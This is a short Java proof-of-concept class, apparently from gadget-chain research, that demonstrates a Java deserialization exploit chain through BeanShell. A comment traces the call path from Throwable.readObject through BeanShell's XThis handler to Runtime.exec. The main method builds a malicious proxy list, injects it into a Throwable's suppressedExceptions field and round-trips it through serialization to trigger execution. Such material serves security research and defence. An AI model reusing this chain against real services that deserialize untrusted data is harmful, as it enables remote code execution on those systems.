package com.example.BeanShell;

import com.example.Evil.BeanShellCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.List;

public class POC_7 {

    /***
     * <java.lang.Throwable: void readObject(java.io.ObjectInputStream)>
     * <bsh.XThis$Handler: java.lang.Object invoke(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.XThis$Handler: java.lang.Object invokeImpl(java.lang.Object,java.lang.reflect.Method,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[])>
     * <bsh.This: java.lang.Object invokeMethod(java.lang.String,java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode)>
     * <bsh.BshMethod: java.lang.Object invoke(java.lang.Object[],bsh.Interpreter,bsh.CallStack,bsh.SimpleNode,boolean)>
     * <bsh.Reflect: java.lang.Object invokeMethod(java.lang.reflect.Method,java.lang.Object,java.lang.Object[])>
     * <java.lang.Runtime: java.lang.Process exec(java.lang.String)>
     */

    public static void main(String[] args) throws Exception {
        InvocationHandler handler = BeanShellCalc.getHandler("isEmpty");
        List l = (List) Proxy.newProxyInstance(List.class.getClassLoader(), new Class<?>[]{List.class}, handler);

        Class clz = Class.forName("java.lang.Throwable");
        Object a = ReflectionUtil.createWithoutConstructor(clz);
        ReflectionUtil.setField(a, "suppressedExceptions", l);

        SerializeUtil.deserialize(SerializeUtil.serialize(a));
    }

}
